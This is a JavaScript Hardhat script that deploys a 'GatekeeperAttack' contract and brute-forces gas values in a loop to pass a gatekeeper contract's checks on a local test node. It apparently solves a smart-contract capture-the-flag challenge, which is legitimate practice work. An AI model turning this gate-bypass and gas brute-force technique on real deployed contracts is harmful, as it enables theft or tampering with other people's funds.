const { ethers } = require("hardhat");
require("dotenv").config();
const CONTRACT_ADDRESS = "0xa12fFA0B9f159BB4C54bce579611927Addc51610";
const PLAYER_ADDRESS = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";
// Create a JsonRpcProvider instance that connects to the local network
const provider = new ethers.providers.JsonRpcProvider("http://localhost:8545");

//   Create a wallet instance (for signing transactions)
const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  // Deploy the GatekeeperAttackFactory Contract
  const GatekeeperAttackFactory = await ethers.getContractFactory(
    "GatekeeperAttack",
    signer
  );
  const GatekeeperAttack = await GatekeeperAttackFactory.deploy(
    CONTRACT_ADDRESS
  );
  await GatekeeperAttack.deployed();
  console.log("PayableContract deployed to:", GatekeeperAttack.address);

  const contractInterface = [
    "function entrant() public view returns (address)",
  ];

  const contract = new ethers.Contract(
    CONTRACT_ADDRESS,
    contractInterface,
    wallet
  );
  console.log(await contract.entrant());

  const gasToUse = 800000;
  const gateKey = await GatekeeperAttack.getKey(PLAYER_ADDRESS);
  console.log(gateKey);
  for (let i = 1; i < 8191; i++) {
    try {
      await GatekeeperAttack.attack(gasToUse + i, gateKey, {
        gasLimit: `950000`,
      });
      console.log(`testing ${gasToUse + i}`);
    } catch (error) {
      console.error(`Error with gas limit`, error);
    }
  }
}
main().catch((error) => {
  console.error(error);
  process.exit(1);
});
